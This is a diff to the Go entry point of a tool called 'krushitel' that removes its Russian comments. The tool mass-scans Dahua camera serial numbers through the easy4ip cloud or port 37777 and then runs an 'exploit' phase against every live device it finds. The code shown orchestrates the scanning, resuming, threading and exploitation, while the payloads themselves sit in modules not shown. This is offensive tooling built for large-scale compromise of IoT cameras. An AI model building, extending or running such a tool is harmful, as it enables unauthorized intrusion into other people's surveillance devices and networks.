@@ -1,22 +1,5 @@
 package main
 
-// headless — CLI-режим без TUI:
-//
-//	krushitel -i 4C6B9E8C2D -m exploit -o papkabebra1337 -t 30
-//	krushitel -i prefixs.txt -m exploit
-//	krushitel -i results.txt -m titles
-//
-// exploit — основной режим в два круга: вход = префикс(ы) (инлайн или
-// файл) и/или серийник(и). [1/2] скан: живые серийники держатся В
-// ОПЕРАТИВНОЙ ПАМЯТИ; краш/прерывание force-пишет в папку результатов
-// crashscan.json (позиция + момент) и crashscan.txt (найденное) —
-// следующий запуск доезжает с позиции. [2/2] крушим найденных.
-// stdout — минималистичный формат (баннер, started, saving, прогресс,
-// [!] err для ошибок СОФТА, finished). Весь сетевой шум и per-serial
-// события — только в log.txt рядом с результатами. config.json тот же,
-// результаты те же (results/done/nostun, session-маркер для resume).
-// Ctrl+C = esc в TUI: чекпоинт/маркер остаются, следующий запуск продолжит.
-
 import (
 	"context"
 	"flag"
@@ -30,16 +13,16 @@ import (
 	"sync/atomic"
 	"time"
 
-	"krushitel/cloud"
-	"krushitel/dhip"
-	"krushitel/exploit"
-	"krushitel/fwd"
-	"krushitel/i18n"
-	"krushitel/ironscan"
-	"krushitel/rtsp"
-	"krushitel/scanner"
-	"krushitel/ui"
-	"krushitel/update"
+	"krushitel/core/cloud"
+	"krushitel/core/dhip"
+	"krushitel/core/exploit"
+	"krushitel/core/fwd"
+	"krushitel/core/i18n"
+	"krushitel/core/ironscan"
+	"krushitel/core/rtsp"
+	"krushitel/core/scanner"
+	"krushitel/core/ui"
+	"krushitel/core/update"
 )
 
 var (
@@ -48,7 +31,6 @@ var (
 	start   time.Time
 )
 
-// flog — файловый лог (сетевой шум, per-serial события). stdout не трогает.
 func flog(format string, args ...any) {
 	logMu.Lock()
 	defer logMu.Unlock()
@@ -58,7 +40,6 @@ func flog(format string, args ...any) {
 	}
 }
 
-// out — строка в stdout И в файл (баннер, started, err — то, что юзер читает).
 func out(format string, args ...any) {
 	logMu.Lock()
 	defer logMu.Unlock()
@@ -68,14 +49,11 @@ func out(format string, args ...any) {
 	}
 }
 
-// isTTY — рисовать прогресс поверх строки (\r) или печатать периодически.
 func isTTY() bool {
 	fi, err := os.Stdout.Stat()
 	return err == nil && fi.Mode()&os.ModeCharDevice != 0
 }
 
-// elapsed — сколько идёт прогон: MM:SS, после часа — H:MM:SS (это не ETA,
-// никакой предсказательной хуйни — просто время в работе).
 func elapsed() string {
 	d := time.Since(start).Truncate(time.Second)
 	h := int(d.Hours())
@@ -87,12 +65,7 @@ func elapsed() string {
 	return fmt.Sprintf("%02d:%02d", m, s)
 }
 
-// cloudAlive — проб главного сервера облака Dahua: TCP-коннект за 5 сек.
-// Без сети скан/эксплойт невозможны (всё через P2P-облако) — фейлим сразу
-// и честно, вместо миллиона таймаутов.
 func cloudAlive() bool {
-	// облако Dahua говорит по UDP — TCP-проба туда лжёт, поэтому «пинг» =
-	// резолв главного сервера (DNS мёртв = сети нет; резолвится = работаем)
 	r := &net.Resolver{}
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 	defer cancel()
@@ -100,8 +73,6 @@ func cloudAlive() bool {
 	return err == nil && len(addrs) > 0
 }
 
-// headlessUsage — хелп -h: баннер + флаги. Локализован через словарь
-// (язык берётся из config.json — LoadSettings/ApplyLang зовутся до печати).
 func headlessUsage() {
 	out("[%s] krushitel v%s", time.Now().Format("15:04"), update.CurrentVersion)
 	rows := [][2]string{
@@ -118,8 +89,6 @@ func headlessUsage() {
 	out(i18n.Tr("Большинство параметров есть в config.json."))
 }
 
-// runHeadless — true: вызов обработан CLI-режимом; false: обычный TUI-старт.
-// Headless — ЛЮБОЙ запуск с флагом (голый `krushitel` = TUI).
 func runHeadless() bool {
 	help := false
 	headless := false
@@ -132,7 +101,6 @@ func runHeadless() bool {
 		}
 	}
 	if help || headless {
-		// конфиг и язык — ДО хелпа/флагов: хелп локализован
 		ui.LoadSettings()
 		ui.ApplyLang()
 	}
@@ -179,7 +147,6 @@ func runHeadless() bool {
 	tty := isTTY()
 	var lineLen int
 
-	// render — строка прогресса поверх строки; в пайпе — раз в 30с полной строкой.
 	render := func(done, total int64, hits string) {
 		line := fmt.Sprintf("%d/%d | %s | %s", done, total, hits, elapsed())
 		logMu.Lock()
@@ -223,7 +190,6 @@ func runHeadless() bool {
 		}
 	}
 
-	// облачные режимы требуют easy4ip; ironscan ходит по прямым IP
 	if *mode != "ironscan" && !cloudAlive() {
 		out("[!] NetErr: Timeout (easy4ip) | Check your internet connection")
 		os.Exit(1)
@@ -240,16 +206,10 @@ func runHeadless() bool {
 	return true
 }
 
-// runHeadlessIronScan — ironscan: двухступенчатая проба 37777 — dhscp-burst
-// (hello + 0xa4:0x07 серийник + 0xa4:0x0b модель, прошивка 0xa4:0x08), пусто
-// → Realm 0xa001 («Realm:Login to <SN>»). Формат целей: masscan -oG
-// («Discovered open port 37777/tcp on IP»), IP, IP:port, CIDR, диапазоны —
-// UTF-16 с BOM понимается; порядок скана псевдослучайный.
 func runHeadlessIronScan(cfg ui.Settings, inFile, outFile string, threads, port int,
 	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
 	targets, terr := ironscan.LoadTargets(inFile)
 	if terr != nil {
-		// файла нет — может, одиночная цель прямо в -i
 		if t := strings.TrimSpace(inFile); t != "" && !strings.ContainsAny(t, " 	") {
 			targets = ironscan.ParseTarget(t)
 		} else {
@@ -348,8 +308,6 @@ func runHeadlessIronScan(cfg ui.Settings, inFile, outFile string, threads, port 
 	return 0
 }
 
-// headlessBanner — баннер + автоапдейт: есть релиз свежее — вопрос y/n,
-// согласие = Install + перезапуск с теми же флагами (restart делает exec).
 func headlessBanner(online bool) {
 	now := time.Now().Format("15:04")
 	if !online {
@@ -381,9 +339,6 @@ func headlessBanner(online bool) {
 	os.Exit(0)
 }
 
-// headlessSignals — двойной Ctrl+C: первое нажатие мягко гасит ctx
-// (движок доезжает текущий серийник, session-маркер остаётся), второе —
-// force-выход. Висящие блокировки больше не игнорируют пользователя.
 func headlessSignals() (context.Context, func()) {
 	ctx, cancel := context.WithCancel(context.Background())
 	sigCh := make(chan os.Signal, 4)
@@ -404,13 +359,10 @@ func headlessSignals() (context.Context, func()) {
 	return ctx, func() { signal.Stop(sigCh); cancel() }
 }
 
-// headlessAskRewrite — «rewrite or modify?» для существующего выхода.
-// true = rewrite (с нуля), false = modify (дописать/продолжить, дефолт).
-// Пустой ответ в пайпе = modify: данные не теряем.
 func headlessAskRewrite(path string, isDir bool) bool {
 	st, err := os.Stat(path)
 	if err != nil || st.IsDir() != isDir {
-		return true // нет — спрашивать не о чем
+		return true
 	}
 	label := "file"
 	if isDir {
@@ -432,7 +384,6 @@ func headlessLogOpen(path string) {
 	logFile = f
 }
 
-// wireHooks — всё сетевое взаимодействие в файл (stdout не засоряем).
 func wireHooks(cfg ui.Settings) func() {
 	fwd.Debug = cfg.Debug
 	fwd.LogHook = func(line string) { flog("%s", line) }
@@ -451,11 +402,6 @@ func wireHooks(cfg ui.Settings) func() {
 	}
 }
 
-// runHeadlessExploit — основной режим: вход = префикс(ы) и/или серийник(и)
-// (файл или инлайн через -i). Есть префиксы → два круга: [1/2] скан (живые
-// только в RAM; краш = crashscan.json/txt в папке результатов, следующий
-// запуск доезжает с позиции) → [2/2] крушим найденных. Только серийники —
-// сразу бой, без скан-фазы.
 func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fresh bool,
 	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
 
@@ -467,7 +413,6 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 	_, isFile := os.Stat(inFile)
 	if outDir == "" {
 		if len(prefixes) > 0 && isFile != nil {
-			// инлайн-ввод — имя папки из префикса
 			if len(prefixes) == 1 {
 				outDir = "prefix_" + prefixes[0]
 			} else {
@@ -483,8 +428,6 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 
 	headlessBanner(true)
 
-	// r/m ДО создания папки: MkdirAll/log.txt ниже создают её сами —
-	// вопрос «already exists» после них срабатывал даже на свежем прогоне
 	rewrite := headlessAskRewrite(outDir, true)
 	if rewrite {
 		for _, f := range []string{exploit.ResultsFile, exploit.DoneFile, exploit.NoStunFile, exploit.SessionFile,
@@ -513,8 +456,6 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 	out("saving results at //%s", outDir)
 	ui.RememberRun(inFile, outDir, threads)
 
-	// resume-семантика: живой session-маркер + непустая ведомость done.txt.
-	// Фильтрация по done.txt/results.csv — внутри RunExploitPhase.
 	resume := false
 	if !fresh {
 		if sess := exploit.ReadSession(outDir); sess != nil {
@@ -525,8 +466,6 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 		}
 	}
 
-	// session-маркер: живёт до чистого завершения (движок удалит).
-	// Prefixes — по ним resume узнаёт свои alive.txt/crashscan.json.
 	exploit.WriteSession(outDir, exploit.SessionInfo{
 		InFile:   inFile,
 		Threads:  threads,
@@ -535,7 +474,6 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 		Prefixes: prefixes,
 	})
 
-	// глобальный лимит одновременных P2P-init'ов — паритет с TUI
 	fwd.InitLimit = 100
 
 	ctx, stop := headlessSignals()
@@ -557,7 +495,6 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 		}
 	}()
 
-	// заголовки фаз на stdout: движок гонит фазы внутри, сюда — шапки
 	go func() {
 		prev := int32(0)
 		for {
@@ -569,8 +506,6 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 				if p == prev {
 					continue
 				}
-				// шапки фаз — только когда есть префиксы (чистый серийник
-				// без скан-фазы идёт по-старому, без [1/2]/[2/2])
 				if p == 1 {
 					out("[1/2] scanning %d serials", scanTotal)
 				}
@@ -619,7 +554,6 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 	close(doneEvents)
 	close(events)
 	if tp.PhaseNum() == 1 {
-		// прервались в скане — финальная строка по скан-фазе
 		renderDone(atomic.LoadInt64(&tp.Scan.PrefixDone), int64(len(prefixes)),
 			fmt.Sprintf("found: %d", tp.FoundCount()))
 	} else {
